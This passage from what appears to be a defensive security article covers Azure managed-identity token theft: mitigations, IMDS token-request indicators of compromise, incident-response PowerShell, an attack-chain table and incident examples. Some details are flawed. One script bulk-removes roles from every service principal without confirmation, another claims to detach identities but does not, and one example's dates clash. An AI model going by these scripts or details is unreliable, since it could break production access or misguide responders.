  **Manual Steps (RBAC Audit):**
  1. Go to **Azure Portal** → **Subscriptions** → **Access Control (IAM)**
  2. Review all role assignments to managed identities
  3. For each MSI:
     - If role is Owner/Contributor: **Remove** and assign specific roles (e.g., Storage Blob Data Reader)
     - If role is at subscription scope: **Lower scope** to resource group or specific resource
  4. Document all MSI permissions in a spreadsheet
  5. Implement automated audits: Use Azure Policy to enforce maximum role levels
  
  **PowerShell Script to Find Overprivileged MSIs:**
  ```powershell
  # Find all MSIs with Owner or high-privilege roles
  Get-AzRoleAssignment | Where-Object {
    $_.ObjectType -eq "ServicePrincipal" -and 
    ($_.RoleDefinitionName -eq "Owner" -or $_.RoleDefinitionName -eq "Contributor")
  } | ForEach-Object {
    Write-Host "Overprivileged MSI: $($_.DisplayName) - $($_.RoleDefinitionName) on $($_.Scope)"
    # Remove the high-privilege role
    Remove-AzRoleAssignment -ObjectId $_.ObjectId -RoleDefinitionName $_.RoleDefinitionName -Scope $_.Scope -Confirm:$false
  }
  ```

### Priority 2: HIGH

- **Enable Managed Identity Token Expiration and Rotation:** Force tokens to be short-lived and rotated frequently.
  
  **Manual Steps:**
  - Token lifetime is controlled by Azure and cannot be directly configured
  - Mitigation: Use Managed Service Identity configuration to minimize exposure window
  - Implement automated rotation of service principal credentials every 30-90 days

- **Monitor and Audit IMDS Requests:** Enable logging for IMDS access to detect token theft.
  
  **Manual Steps (Azure Diagnostics):**
  1. Navigate to **Azure Portal** → **Virtual Machines** → Select VM
  2. Go to **Settings** → **Diagnostic settings**
  3. Add diagnostic setting:
     - Destination: **Log Analytics Workspace**
     - Logs: Enable **All logs** (or at minimum, **Activity Log**)
  4. Save
  5. Configure Sentinel rule to detect IMDS access (see Detection section)

- **Restrict Service Principal Creation to Approved Identities:** Only certain roles should be able to create service principals.
  
  **Manual Steps (Custom RBAC Role):**
  1. Create a custom role without "Add application" or "Add service principal" permissions
  2. Assign this role to developers instead of Application Administrator
  3. Only trusted security teams get full Application Administrator rights

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **IMDS Access:**
  - Unexpected requests to 169.254.169.254/metadata/identity/oauth2/token
  - Multiple token requests from a single resource in short time window
  
- **Token Usage:**
  - Access tokens used for unusual API calls (RBAC modification, application creation)
  - Tokens used outside normal geographic locations or times
  
- **Service Principal/Application Creation:**
  - New applications created by managed identities or service principals
  - New service principals with Entra ID admin roles assigned

### Forensic Artifacts

- **Azure Activity Log:**
  - Event: "Add role assignment" with MSI as caller
  - Event: "Add service principal" initiated by MSI
  - Event: "Add application" from unexpected source
  
- **Cloud Logs:**
  - IMDS requests (if logging enabled)
  - Token requests in Azure diagnostics
  - API calls using stolen token

### Response Procedures

1. **Isolate:**
   - Immediately disable the compromised managed identity
   - Revoke all active access tokens
   - Remove the managed identity from all resources
   
   **Command (PowerShell):**
   ```powershell
   # Get the compromised MSI
   $msi = Get-AzUserAssignedIdentity -Name "CompromisedMSI"
   
   # Remove all role assignments
   Get-AzRoleAssignment -ObjectId $msi.PrincipalId | Remove-AzRoleAssignment
   
   # Remove from all resources it's attached to
   Get-AzVM | Where-Object { $_.Identity.UserAssignedIdentities.Keys -contains $msi.Id } | ForEach-Object {
     Update-AzVM -ResourceGroupName $_.ResourceGroupName -VM $_
   }
   ```

2. **Collect Evidence:**
   - Export Azure Activity Log for past 7-30 days
   - Export Entra ID audit logs
   - Extract any new service principals or applications created
   
   **Command (PowerShell):**
   ```powershell
   # Export activity log
   Get-AzLog -StartTime (Get-Date).AddDays(-30) | Export-Csv -Path "C:\Incident\activity_log_30days.csv"
   ```

3. **Remediate:**
   - Delete any backdoor service principals or applications
   - Reset all user and application credentials
   - Reimage affected Azure resources
   - Deploy clean managed identities with least privilege
   
   **Command:**
   ```powershell
   # Remove backdoor applications
   Get-AzADApplication -DisplayName "BackdoorApp" | Remove-AzADApplication
   
   # Remove backdoor service principals
   Get-AzADServicePrincipal -DisplayName "BackdoorSP" | Remove-AzADServicePrincipal
   ```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-003] Logic App HTTP Trigger Abuse | Attacker deploys malicious logic app or finds vulnerable existing one |
| **2** | **Privilege Escalation** | **[PE-VALID-011]** | **Steal managed identity token via IMDS or SSRF** |
| **3** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Permissions Escalation | Escalate to service principal with higher permissions |
| **4** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Create Global Admin service principal for long-term access |
| **5** | **Data Exfiltration** | [CA-UNSC-007] Azure Key Vault Secret Extraction | Dump all tenant secrets via stolen identity |
| **6** | **Impact** | Complete tenant compromise | Full control of Azure subscriptions and Entra ID |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: Praetorian - Azure VM Privilege Escalation (2025)

- **Target:** Enterprise with overprivileged managed identities on VMs
- **Timeline:** Compromised VM via RDP (January 2025) → Queried IMDS endpoint (January 2025) → Obtained Owner-level token (January 2025) → Modified RBAC to create backdoor (January 2025)
- **Technique Status:** Managed identity had Owner role on subscription; attacker created new admin user and service principal with Global Admin in Entra ID within minutes of VM compromise
- **Impact:** Complete subscription and tenant compromise
- **Reference:** [Praetorian: Azure RBAC Privilege Escalations](https://www.praetorian.com/blog/azure-rbac-privilege-escalations-azure-vm/)

### Example 2: Cyngular - Pass-the-Token via Managed Identity (2025)

- **Target:** Financial services organization with Function Apps using managed identities
- **Timeline:** SSRF vulnerability in Function App (August 2024) → Attacker exploited SSRF to query IMDS (August 2024) → Stole Contributor-level token (August 2024) → Escalated to Owner via runbook execution (August 2024)
- **Technique Status:** Managed identity had Contributor role; attacker created Automation Account and runbook to escalate to Owner
- **Impact:** Access to Key Vaults; extraction of database passwords; lateral movement to on-premises
- **Reference:** [Cyngular: Pass-the-Token Attacks](https://www.cyngular.com/resource-center/exploiting-identity-in-azure-the-real-impact-of-pass-the-token-attacks/)

### Example 3: BeyondTrust - "Evil VM" Device Identity Abuse (2025)

- **Target:** Enterprise with guest users and Entra ID-joined VMs
- **Timeline:** Guest user compromised (February 2025) → Registered Azure VM as device (February 2025) → Stole Primary Refresh Token (PRT) via phishing (February 2025) → Escalated to Global Admin via device identity (February 2025)
- **Technique Status:** Combination of device identity abuse and PRT theft; eventually leveraged managed identity on hybrid infrastructure to gain on-premises access
- **Impact:** Complete Entra ID and hybrid infrastructure compromise
- **Reference:** [BeyondTrust: "Evil VM" - Guest to Entra Admin](https://www.beyondtrust.com/blog/entry/evil-vm)

---

## 16. COMPLIANCE & REGULATORY CONTEXT

This technique directly violates:

- **GDPR Art. 32:** Requires appropriate technical measures for data security; token theft violates this
- **NIST 800-53 AC-3:** Requires access control enforcement; overprivileged managed identities fail this
- **ISO 27001 A.9.2.3:** Requires privileged access management; managed identities should be subject to same controls as user accounts
- **NIS2 Art. 21:** Requires cyber risk management; token theft is a critical risk

Organizations must enforce least privilege, monitor IMDS access, and audit managed identity usage to maintain compliance.

---

## 17. REFERENCES & AUTHORITATIVE SOURCES

1. [Microsoft: Azure Managed Identities Documentation](https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/)
2. [Microsoft: Instance Metadata Service (IMDS) Documentation](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)
3. [Praetorian: Azure VM Privilege Escalation](https://www.praetorian.com/blog/azure-rbac-privilege-escalations-azure-vm/)
4. [Cyngular: Pass-the-Token Attacks in Azure](https://www.cyngular.com/resource-center/exploiting-identity-in-azure-the-real-impact-of-pass-the-token-attacks/)
5. [NetSPI: Managed Identity Privilege Escalation](https://www.netspi.com/blog/technical-blog/cloud-pentesting/azure-privilege-escalation-using-managed-identities/)
6. [Orca Security: SSRF in Azure Services](https://orca.security/resources/blog/ssrf-vulnerabilities-in-four-azure-services/)
7. [BeyondTrust: "Evil VM" Attack Chain](https://www.beyondtrust.com/blog/entry/evil-vm)
8. [Checkpoint: Privilege Escalation in Azure](https://blog.checkpoint.com/2022/06/08/privilege-escalation-in-azure-keep-your-enemies-close-and-your-permissions-closer/)
9. [MITRE ATT&CK: T1078.004 Valid Accounts - Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)
10. [HackingTheCloud: Abusing Managed Identities](https://hackingthe.cloud/azure/abusing-managed-identities/)

---